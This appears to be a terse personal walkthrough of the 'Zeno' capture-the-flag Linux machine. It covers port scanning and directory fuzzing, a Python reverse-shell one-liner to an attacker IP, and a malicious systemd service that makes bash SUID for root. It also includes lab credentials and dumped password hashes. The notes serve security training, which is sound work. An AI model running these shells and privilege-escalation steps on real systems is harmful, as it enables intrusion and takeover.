# Zeno

#Linux 

## Reconnaissance

```
$ nmap -p- -sV -sC -Pn 10.65.187.29
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-18 05:25 -0500
Stats: 0:03:26 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 05:29 (0:00:12 remaining)
Nmap scan report for 10.65.187.29
Host is up (0.13s latency).
Not shown: 65336 filtered tcp ports (no-response), 197 filtered tcp ports (host-prohibited)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 09:23:62:a2:18:62:83:69:04:40:62:32:97:ff:3c:cd (RSA)
|   256 33:66:35:36:b0:68:06:32:c1:8a:f6:01:bc:43:38:ce (ECDSA)
|_  256 14:98:e3:84:70:55:e6:60:0c:c2:09:77:f8:b7:a6:1c (ED25519)
12340/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: We&#39;ve got some trouble | 404 - Resource not found
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 211.64 seconds
```

By accessing the port `12340`, I got thus following page.

img1

## Enumeration

Since I didn't find anything, I started enumerating directories and I found `rms` directory.

```
$ ffuf -u http://10.65.187.29:12340/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.65.187.29:12340/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

rms                     [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 127ms]
```

I got this page

img2

```
export RHOST="192.168.130.101";export RPORT=1337;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```


```
cat <<EOF > /etc/systemd/system/zeno-monitoring.service
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "chmod +s /bin/bash"

[Install]
WantedBy=multi-user.target
EOF
```


    $conn = mysqli_connect("127.0.0.1", "root", "veerUffIrangUfcubyig", "dbrms");


```
MariaDB [dbrms]> select * from members;
+-----------+-----------+----------+--------------------------+----------------------------------+-------------+----------------------------------+
| member_id | firstname | lastname | login                    | passwd                           | question_id | answer                           |
+-----------+-----------+----------+--------------------------+----------------------------------+-------------+----------------------------------+
|        15 | Stephen   | Omolewa  | omolewastephen@gmail.com | 81dc9bdb52d04dc20036dbd8313ed055 |           9 | 51977f38bb3afdf634dd8162c7a33691 |
|        16 | John      | Smith    | jsmith@sample.com        | 1254737c076cf867dc53d60a0364f38e |           8 | 9f2780ee8346cc83b212ff038fcdb45a |
|        17 | edward    | zeno     | edward@zeno.com          | 6f72ea079fd65aff33a67a3f3618b89c |           8 | 6f72ea079fd65aff33a67a3f3618b89c |
|        18 | niz       | yuu      | niz@test.com             | 202cb962ac59075b964b07152d234b70 |           8 | 202cb962ac59075b964b07152d234b70 |
+-----------+-----------+----------+--------------------------+----------------------------------+-------------+----------------------------------+
```


john

|                                  |     |           |
| -------------------------------- | --- | --------- |
| 1254737c076cf867dc53d60a0364f38e | md5 | jsmith123 |
stephen 1234


## Privilege Escalation

```
cat << EOF > /etc/systemd/system/zeno-monitoring.service
[Unit]
Description=Zeno monitoring

[Service]
Type=oneshot 
User=root
ExecStart=/bin/bash -c 'cp /bin/bash /home/edward/bash; chmod +xs /home/edward/bash'

[Install]
WantedBy=multi-user.target
EOF
```


```


-rw-------. 1 edward edward 1 Sep 21  2021 /home/edward/.ssh/authorized_keys

-rw-r--r--. 1 root root 162 Jun  8  2021 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r--. 1 root root 82 Jun  8  2021 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r--. 1 root root 382 Jun  8  2021 /etc/ssh/ssh_host_rsa_key.pub
-rw-r--r--. 1 root root 1665 May 12  2006 /usr/share/doc/pygpgme-0.3/tests/keys/key1.pub
-rw-r--r--. 1 root root 3181 May 12  2006 /usr/share/doc/pygpgme-0.3/tests/keys/key2.pub
-rw-r--r--. 1 root root 908 May 12  2006 /usr/share/doc/pygpgme-0.3/tests/keys/passphrase.pub
-rw-r--r--. 1 root root 1454 May 12  2006 /usr/share/doc/pygpgme-0.3/tests/keys/revoked.pub
-rw-r--r--. 1 root root 4046 May 12  2006 /usr/share/doc/pygpgme-0.3/tests/keys/signonly.pub

```


```
,username=zeno,password=FrobjoodAdkoonceanJa
```


```
[edward@zeno home]$ sudo /usr/sbin/reboot 
```

/home/edward/bash -p